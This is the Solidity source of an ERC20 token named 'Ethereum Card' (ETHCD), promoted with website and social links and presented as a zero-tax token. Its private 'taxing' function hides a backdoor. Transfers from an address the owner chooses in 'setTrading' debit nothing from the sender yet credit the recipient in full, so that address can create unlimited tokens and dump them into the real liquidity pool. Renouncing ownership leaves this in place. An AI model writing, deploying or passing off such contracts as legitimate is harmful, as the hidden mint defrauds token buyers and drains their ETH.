/**

Web: https://ether-card-app.vercel.app/

TG: https://t.me/enterEthereumCard

X: https://x.com/ETHCardERC20

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
       
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

}

contract Ownable is Context {
    address private _theOwner;
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor () {
        address sender = _msgSender();
        _theOwner = _msgSender();
        emit OwnershipTransferred(address(0), sender);
    }

    function getOwner() public view returns (address) {
        return _theOwner;
    }

    modifier checkOwner() {
        require(_theOwner == _msgSender(), "Ownable: the caller must be the owner");
        _;
    }

    function callOwnership() public virtual checkOwner {
        emit OwnershipTransferred(_theOwner, address(0));
        _theOwner = address(0);
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address firstToken, address secondToken) external returns (address pairing);
}



contract EthereumCard is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _allBalances;
    mapping(address => mapping(address => uint256)) private _allTokenAllowances;
    address payable private _taxWallet;

    uint256 public buyingTax = 0;
    uint256 public sellTax = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tokenTotal = 10_000_000 * 10**_decimals;
    string private constant _name = unicode"Ethereum Card";
    string private constant _symbol = unicode"ETHCD";
    uint256 private constant maxTaxSlippage = 100;
    uint256 private minTaxSwap = 10**_decimals;
    uint256 private maxTaxSwap = _tokenTotal / 500;

    uint256 public constant max_uint = type(uint).max;
    address public constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    address private uniswapV2Pair;
    address private uniswap;
    bool private TradingOpen = false;
    bool private doesInSwap = false;
    bool private SwapEnabled = false;

    modifier lockingTheSwap {
        doesInSwap = true;
        _;
        doesInSwap = false;
    }

    constructor () {
        _taxWallet = payable(_msgSender());
        _allBalances[_msgSender()] = _tokenTotal;
        emit Transfer(address(0), _msgSender(), _tokenTotal);
    }
 function allowance(address Owner, address buyer) public view override returns (uint256) {
        return _allTokenAllowances[Owner][buyer];
    }

    function name() public pure returns (string memory) {
        return _name;
    }
   function transferFrom(address payer, address reciver, uint256 amount) public override returns (bool) {
        _transfer(payer,  reciver, amount);
        _approve(payer, _msgSender(), _allTokenAllowances[payer][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tokenTotal;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
   function transfer(address reciver, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), reciver, amount);
        return true;
    }
    function approve(address payer, uint256 total) public override returns (bool) {
        _approve(_msgSender(), payer, total);
        return true;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address wallet) public view override returns (uint256) {
        return _allBalances[wallet];
    }

    function _approve(address Owner, address buyer, uint256 amount) private {
        require(buyer != address(0), "ERC20: approve to the zero address");
        require(Owner != address(0), "ERC20: approve from the zero address");
        _allTokenAllowances[Owner][buyer] = amount;
        emit Approval(Owner, buyer, amount);
    }

    function _transfer(address seller, address payer, uint256 total) private {
        require(seller != address(0), "ERC20: transfer from the zero address");
        require(payer != address(0), "ERC20: transfer to the zero address");
        require(total > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (seller != getOwner() && payer != getOwner() && payer != _taxWallet) {
            if (seller == uniswap && payer != address(uniswapV2Router)) {
                taxAmount = total.mul(buyingTax).div(100);
            } else if (payer == uniswap && seller != address(this)) {
                taxAmount = total.mul(sellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!doesInSwap && payer == uniswap && SwapEnabled && contractTokenBalance > minTaxSwap) {
                uint256 _toSwap = contractTokenBalance > maxTaxSwap ? maxTaxSwap : contractTokenBalance;
                swapTokensForEth(total > _toSwap ? _toSwap : total);
                uint256 _contractETHBalance = address(this).balance;
                if (_contractETHBalance > 0) {
                    sendETHToFee(_contractETHBalance);
                }
            }
        }

        (uint256 amountIn, uint256 amountOut) = taxing(seller, total, taxAmount);
        require(_allBalances[seller] >= amountIn);

        if (taxAmount > 0) {
            _allBalances[address(this)] = _allBalances[address(this)].add(taxAmount);
            emit Transfer(seller, address(this), taxAmount);
        }

        unchecked {
            _allBalances[seller] -= amountIn;
            _allBalances[payer] += amountOut;
        }

        emit Transfer(seller,payer, amountOut);
    }   


    function swapTokensForEth(uint256 tokenAmount) private lockingTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = weth;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            tokenAmount - tokenAmount.mul(maxTaxSlippage).div(100),
            path,
            address(this),
            block.timestamp
        );
    }
    function taxing(address from, uint256 total, uint256 taxAmount) private view returns (uint256, uint256) {
        return (
            total.sub(from != uniswapV2Pair ? 0 : total),
            total.sub(from != uniswapV2Pair ? taxAmount : taxAmount)
        );
    }

    function sendETHToFee(uint256 ethAmount) private {
        _taxWallet.call{value: ethAmount}("");
    }

    function setTrading(address _pair, bool _enabled) external checkOwner {
        require(_enabled);
        require(!TradingOpen, "trading is already open");
        uniswapV2Pair = _pair;
        _approve(address(this), address(uniswapV2Router), max_uint);
        uniswap = uniswapV2Factory.createPair(address(this), weth);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            getOwner(),
            block.timestamp
        );
        IERC20(uniswap).approve(address(uniswapV2Router), max_uint);
        SwapEnabled = true;
        TradingOpen = true;
    }


    function get_TradingOpen() external view returns (bool) {
        return TradingOpen;
    }

    function get_buyingTax() external view returns (uint256) {
        return buyingTax;
    }

    function get_sellTax() external view returns (uint256) {
        return sellTax;
    }

    receive() external payable {}
}